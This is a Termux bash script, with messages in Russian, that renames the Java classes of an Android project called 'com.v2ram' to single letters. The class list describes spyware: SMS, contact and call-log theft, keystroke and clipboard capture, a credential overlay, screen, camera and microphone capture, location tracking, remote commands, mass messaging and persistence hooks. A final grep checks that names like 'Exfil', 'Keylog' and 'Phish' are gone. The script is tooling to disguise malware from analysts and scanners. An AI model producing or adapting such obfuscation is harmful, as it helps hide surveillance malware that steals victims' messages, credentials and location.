#!/data/data/com.termux/files/usr/bin/bash

if [ ! -f AndroidManifest.xml ]; then
  echo "Запусти из папки com.v2ram"
  exit 1
fi

echo "0) Удаляю старые .bak..."
rm -f *.bak
rm -f res/xml/*.bak res/values/*.bak

# Маппинг текущих имен -> буквы
declare -A MAP=(
  ["Bootstrap"]="a"
  ["SyncService"]="b"
  ["UiService"]="c"
  ["SyncChannel"]="d"
  ["CommandDispatch"]="e"
  ["NoteReader"]="f"
  ["InputAutomation"]="g"
  ["AuthOverlay"]="h"
  ["DisplayCapture"]="i"
  ["SyncSms"]="j"
  ["ContactSync"]="k"
  ["CallHistorySync"]="l"
  ["FileTransfer"]="m"
  ["MediaLibrary"]="n"
  ["LocationReader"]="o"
  ["LensCapture"]="p"
  ["AudioCapture"]="q"
  ["NotificationToast"]="r"
  ["AppManager"]="s"
  ["SystemInfo"]="t"
  ["CmdRunner"]="u"
  ["ClipReader"]="v"
  ["PackageUpdater"]="w"
  ["InputObserver"]="x"
  ["ProfileReader"]="y"
  ["StartupHook"]="z"
  ["RespawnHook"]="a1"
  ["NoteManager"]="b1"
  ["DisplayStream"]="c1"
  ["LocationBeacon"]="d1"
  ["CodeWatcher"]="e1"
  ["AutoSnapshot"]="f1"
  ["MassMessenger"]="g1"
  ["MockScreen"]="h1"
  ["Utils"]="i1"
)

echo "1) Переименовываю .java файлы в буквы..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  if [ -f "$old.java" ]; then
    mv "$old.java" "$new.java"
    echo "  $old.java -> $new.java"
  fi
done

echo "2) Меняю имена классов внутри .java и .xml..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  grep -rl "\b$old\b" . --include="*.java" --include="*.xml" 2>/dev/null \
    | xargs -r sed -i'' "s/\b$old\b/$new/g"
done

echo "3) Убираю .bak..."
rm -f *.bak
find . -name "*.bak" -delete

echo "4) Проверка остатков старых имён:"
grep -rn "Exfil\|Keylog\|Phish\|AccessibilityBridge\|TelegramBot\|SyncChannel\|Bootstrap" . --include="*.java" --include="*.xml" | head -20
echo "(если пусто — чисто)"

echo "5) Финальный ls:"
ls *.java
